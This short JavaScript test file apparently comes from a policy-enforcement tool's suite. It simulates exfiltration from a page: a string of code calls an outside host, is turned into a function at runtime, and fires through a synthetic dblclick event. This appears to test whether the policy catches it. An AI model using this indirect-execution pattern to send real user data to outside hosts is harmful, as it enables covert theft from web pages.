// exfil_test_dispatch.js
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);';
  var button = document.getElementById("test");
  var event$$1 = new Event("dblclick");
  JAM.call(button.addEventListener, button, ["dblclick", JAM.call(Function, null, [exp]), false], JAM.policy.p1);
  button.dispatchEvent(event$$1);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

